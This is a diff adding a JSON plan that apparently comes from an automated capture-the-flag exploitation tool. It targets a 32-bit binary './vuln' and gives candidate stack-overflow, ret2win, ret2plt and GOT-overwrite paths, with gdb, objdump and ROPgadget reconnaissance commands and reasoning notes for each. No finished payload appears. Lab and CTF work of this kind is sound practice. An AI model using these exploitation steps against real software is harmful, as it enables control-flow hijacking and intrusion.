@@ -1,0 +1,176 @@
+{
+  "candidates": [
+    {
+      "function": "main",
+      "vuln": "Stack BOF",
+      "why": "gets@plt 0x080483d0; buf [ebp-0x80]; no canary; RET @main+0x1d (0x080485e9)",
+      "cot_now": "We should confirm controllable EIP and determine the exact overwrite offset using a cyclic pattern. This validates the overflow scope without guessing and gives a precise pivot for any later ROP/ret2win plan. Running under gdb also documents the crash and register state for reproducibility.",
+      "thought": "Derive exact EIP offset by crashing under gdb with a cyclic pattern and parsing EIP.",
+      "tasks": [
+        {
+          "name": "checksec",
+          "cmd": "checksec --file=./vuln | tee checksec.txt",
+          "success": "No canary found",
+          "artifact": "checksec.txt"
+        },
+        {
+          "name": "crash with cyclic",
+          "cmd": "python3 - << 'PY'\nfrom pwn import cyclic\nprint(cyclic(400).decode())\nPY > pat.txt && gdb -q ./vuln -ex 'set pagination off' -ex 'run < pat.txt' -ex 'i r eip' -ex 'bt' -ex 'quit' | tee gdb_eip.txt",
+          "success": "re:eip\\s+0x[0-9a-f]+",
+          "artifact": "gdb_eip.txt"
+        },
+        {
+          "name": "derive offset",
+          "cmd": "python3 - << 'PY'\nimport re\nfrom pwn import cyclic_find\ns=open('gdb_eip.txt').read()\nm=re.search(r'eip\\s+0x([0-9a-f]+)',s)\nprint(cyclic_find(int(m.group(1),16)))\nPY | tee offset.txt",
+          "success": "re:^\\d+$",
+          "artifact": "offset.txt"
+        },
+        {
+          "name": "confirm segv",
+          "cmd": "grep -Ei 'SIGSEGV|segmentation fault' gdb_eip.txt | tee crash.txt",
+          "success": "SIGSEGV",
+          "artifact": "crash.txt"
+        }
+      ],
+      "expected_signals": [
+        {
+          "type": "offset",
+          "name": "eip_offset",
+          "hint": "decimal number in offset.txt"
+        },
+        {
+          "type": "crash",
+          "name": "eip_control",
+          "hint": "EIP shows 0x41.. pattern-derived value"
+        },
+        {
+          "type": "mitigation",
+          "name": "no_canary",
+          "hint": "checksec shows No canary found"
+        }
+      ]
+    },
+    {
+      "function": "read_flag",
+      "vuln": "ret2win",
+      "why": "read_flag() @0x080485b9 calls system(\"cat flag\"); No PIE => stable addr",
+      "cot_now": "Since NX is enabled, a return-to-function (ret2win) is ideal if a function already prints the flag. Verify the exact address of read_flag and record it alongside a simple 'ret' gadget for stack alignment if needed. This builds a minimal call plan requiring only EIP control and no arguments.",
+      "thought": "Extract and record read_flag address and a nearby ret gadget for a one-shot ret2win.",
+      "tasks": [
+        {
+          "name": "list symbols",
+          "cmd": "readelf -s ./vuln | egrep 'read_flag|main|initialize' | tee symbols.txt",
+          "success": "read_flag",
+          "artifact": "symbols.txt"
+        },
+        {
+          "name": "verify read_flag addr",
+          "cmd": "objdump -d -M intel ./vuln | grep -n '080485b9 <read_flag>' | tee read_flag_grep.txt",
+          "success": "read_flag",
+          "artifact": "read_flag_grep.txt"
+        },
+        {
+          "name": "find ret gadget",
+          "cmd": "ROPgadget --binary ./vuln --only 'ret' | head -n 10 | tee rop_ret.txt",
+          "success": "Gadgets information",
+          "artifact": "rop_ret.txt"
+        }
+      ],
+      "expected_signals": [
+        {
+          "type": "symbol",
+          "name": "read_flag_addr",
+          "hint": "0x080485b9"
+        },
+        {
+          "type": "gadget",
+          "name": "ret_gadget",
+          "hint": "address of a 'ret' in .text"
+        }
+      ]
+    },
+    {
+      "function": "main",
+      "vuln": "ret2plt",
+      "why": "system@plt 0x08048410; \"cat flag\" str @0x08048679; No PIE",
+      "cot_now": "As an alternative to ret2win, use system@plt with the existing \"cat flag\" string. Verify both the PLT entry and the exact address of the string to ensure stable pointers. This provides a fallback chain if calling read_flag is filtered or to cross-check addresses prior to payload crafting.",
+      "thought": "Verify system@plt and the address of \"cat flag\" for a direct ret2plt call.",
+      "tasks": [
+        {
+          "name": "locate cat flag string",
+          "cmd": "strings -t x -a ./vuln | grep -n 'cat flag' | tee catflag_str.txt",
+          "success": "cat flag",
+          "artifact": "catflag_str.txt"
+        },
+        {
+          "name": "system@plt address",
+          "cmd": "objdump -d -M intel ./vuln | grep -n '08048410 <system@plt>' | tee system_plt.txt",
+          "success": "system@plt",
+          "artifact": "system_plt.txt"
+        },
+        {
+          "name": "plt sanity",
+          "cmd": "readelf -s ./vuln | egrep 'system|puts|gets' | tee dynsym_funcs.txt",
+          "success": "system",
+          "artifact": "dynsym_funcs.txt"
+        }
+      ],
+      "expected_signals": [
+        {
+          "type": "symbol",
+          "name": "system_plt",
+          "hint": "0x08048410"
+        },
+        {
+          "type": "symbol",
+          "name": "cat_flag_str",
+          "hint": "0x08048679"
+        }
+      ]
+    },
+    {
+      "function": "alarm_handler",
+      "vuln": "GOT overwrite (via ROP)",
+      "why": "No RELRO; exit@got 0x080498fc; exit@plt 0x08048420; gets usable to write",
+      "cot_now": "Prepare a write-what-where plan using gets@plt to overwrite a GOT entry, then trigger it. exit is a convenient target since alarm_handler and cleanups call exit, but we can also directly call exit@plt after overwriting exit@got to point to read_flag. First enumerate exact GOT slots and confirm exit@got address.",
+      "thought": "Enumerate GOT/PLT addresses and confirm exit@got for a gets-driven GOT overwrite path.",
+      "tasks": [
+        {
+          "name": "relocations/GOT",
+          "cmd": "objdump -R ./vuln | egrep 'exit|puts|system|gets' | tee got_map.txt",
+          "success": "exit",
+          "artifact": "got_map.txt"
+        },
+        {
+          "name": "exit dynsym",
+          "cmd": "readelf -s ./vuln | grep -n ' exit@' | tee exit_dynsym.txt",
+          "success": "exit@",
+          "artifact": "exit_dynsym.txt"
+        },
+        {
+          "name": "confirm gets@plt",
+          "cmd": "objdump -d -M intel ./vuln | grep -n '<gets@plt>' | tee gets_plt.txt",
+          "success": "gets@plt",
+          "artifact": "gets_plt.txt"
+        }
+      ],
+      "expected_signals": [
+        {
+          "type": "symbol",
+          "name": "exit_got",
+          "hint": "0x080498fc (from objdump -R)"
+        },
+        {
+          "type": "symbol",
+          "name": "exit_plt",
+          "hint": "0x08048420"
+        },
+        {
+          "type": "symbol",
+          "name": "gets_plt",
+          "hint": "0x080483d0"
+        }
+      ]
+    }
+  ]
+}
